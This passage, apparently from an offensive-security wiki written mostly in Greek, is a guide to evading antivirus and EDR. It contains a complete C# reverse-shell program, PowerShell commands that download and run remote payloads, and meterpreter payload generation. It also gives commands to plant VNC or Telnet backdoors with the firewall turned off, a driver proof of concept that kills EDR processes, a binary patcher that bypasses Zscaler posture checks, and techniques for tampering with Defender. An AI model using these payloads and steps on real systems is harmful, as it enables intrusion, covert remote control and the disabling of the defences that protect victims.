> 🛈  ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη τριάζ των samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code χωρίς χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή αυτού που θέλει να crack την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator ικανός να obfuscate διάφορα pe files όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένα απλό metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές οδηγίες σε ROP chains, υπονομεύοντας την φυσική μας αντίληψη του normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor είναι ικανό να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα load

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια executables από το internet και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που στοχεύει στην προστασία του end user από το να τρέξει πιθανώς malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια reputation-based προσέγγιση, που σημαίνει ότι εφαρμογές που δεν κατεβάζονται συχνά θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας και εμποδίζοντας τον end user από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα κατά το download αρχείων από το internet, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables που έχουν υπογραφεί με ένα **trusted** signing certificate **won't trigger SmartScreen**.

Μια πολύ αποτελεσματική μέθοδος για να αποτρέψετε τα payloads σας από το να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** εφαρμοστεί σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στο Windows που επιτρέπει σε εφαρμογές και συστατικά συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και την ανίχνευση κακόβουλων δραστηριοτήτων.

Παρόμοια με το πώς το AMSI απενεργοποιείται (bypassed), είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει κανένα συμβάν. Αυτό γίνεται με το patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για εκείνη τη διεργασία.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και καιρό και παραμένει ένας εξαιρετικός τρόπος για να τρέξετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα χρειαστεί να ασχοληθούμε μόνο με το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την εισαγωγή (inject) του post-exploitation κακόβουλου κώδικα **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το να σαρωθεί από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** της συμβιβασμένης μηχανής.

Το repo αναφέρει: Defender εξακολουθεί να σαρώνει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία να παρακάμψουμε στατικά signatures**. Οι δοκιμές με τυχαία μη-αποκρυπτογραφημένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειραγωγήσει το access token ή ένα προϊόν ασφαλείας όπως ένα EDR ή AV**, μειώνοντας τα προνόμιά του ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop σε έναν υπολογιστή θύμα και να το χρησιμοποιήσετε για takeover και διατήρηση persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Η αποφυγή ανίχνευσης (evasion) είναι ένα πολύπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που θα αντιμετωπίσετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Σας προτρέπω ανεπιφύλακτα να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να πάρετε εισαγωγή σε πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **ανακαλύψει ποιο τμήμα ο Defender** βρίσκει ως κακόβουλο και να σας το υποδείξει.\
Ένα άλλο εργαλείο που κάνει το **ίδιο πράγμα είναι** το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το να **ξεκινά** όταν το σύστημα ξεκινά και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε telnet port** (stealth) και απενεργοποιήστε το firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ στον **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να εκτελέσει στον δικό του **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι έτοιμος να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στον **victim**: Ξεκινήστε τον daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε την stealth πρέπει να μην κάνετε μερικά πράγματα

- Don't start `winvnc` if it's already running or you'll trigger a [popup]. check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window] to open
- Don't run `winvnc -h` for help or you'll trigger a [popup]

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας μεταγλωττιστή
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python — παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από Kernel Space

Το Storm-2603 εκμεταλλεύτηκε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει endpoint protections πριν ρίξει ransomware. Το εργαλείο φέρνει τον δικό του **vulnerable αλλά *signed* driver** και τον καταχράται για να εκτελέσει privileged kernel operations που ούτε οι Protected-Process-Light (PPL) AV υπηρεσίες μπορούν να μπλοκάρουν.

Κύρια σημεία
1. **Signed driver**: Το αρχείο που κατατίθεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Εφόσον ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν ο Driver-Signature-Enforcement (DSE) είναι ενεργός.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον ξεκινά ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει αυθαίρετη διεργασία με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode προστασίες· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να παραποιήσει kernel αντικείμενα ανεξαρτήτως PPL/PP, ELAM ή άλλων μηχανισμών σκληρής προστασίας.

Ανίχνευση / Μείωση
• Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται το φόρτωμα του `AToolsKrnl64.sys`.  
• Παρακολουθείστε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους (world-writable) ή όταν δεν βρίσκεται στη λίστα επιτρεπόμενων.  
• Παρακολουθείστε user-mode handles προς custom device objects που ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Zscaler Client Connector Posture Checks μέσω On-Disk Binary Patching

Ο **Client Connector** της Zscaler εφαρμόζει κανόνες device-posture τοπικά και βασίζεται σε Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές επιτρέπουν πλήρη παράκαμψη:

1. Η αξιολόγηση της posture γίνεται εξ ολοκλήρου client-side (αποστέλλεται ένα boolean στον server).  
2. Οι εσωτερικοί RPC endpoints επαληθεύουν μόνο ότι το συνδεόμενο εκτελέσιμο είναι υπογεγραμμένο από τη Zscaler (μέσω `WinVerifyTrust`).

Με την **τροποποίηση τεσσάρων υπογεγραμμένων binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να αχρηστευτούν:

| Binary | Αρχική λογική που τροποποιήθηκε | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) διεργασία μπορεί να δεσμεύσει τα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Παρακμή/παρακάμφθηκαν |

Ελάχιστο απόσπασμα του patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Αφού αντικαταστάθηκαν τα αρχικά αρχεία και επανεκκινήθηκε η στοίβα υπηρεσιών:

* **Όλοι** οι posture checks εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο διαβλητός host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς αποκλειστικά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.

## Κατάχρηση Protected Process Light (PPL) για παραποίηση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level ιεραρχία έτσι ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγχετε τα arguments του, μπορείτε να μετατρέψετε αθώα λειτουργικότητα (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive εναντίον προστατευμένων καταλόγων που χρησιμοποιούνται από AV/EDR.

Τι κάνει μια διεργασία να τρέχει ως PPL
- Το target EXE (και οποιεσδήποτε φορτωμένες DLLs) πρέπει να είναι υπογεγραμμένα με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λάθος επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Παράδειγμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο σύστημα binary `C:\Windows\System32\ClipUp.exe` αυτοεκκινεί και δέχεται παράμετρο για να γράψει ένα log file σε διαδρομή που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να επεξεργαστεί μονοπάτια που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Ταυτοποίηση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Προσδιορισμός σύντομου μονοπατιού στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το LOLBIN που υποστηρίζει PPL (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας launcher (π.χ., CreateProcessAsPPL).
2) Δώστε το ClipUp log-path argument για να επιβάλετε τη δημιουργία αρχείου σε έναν προστατευμένο AV κατάλογο (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
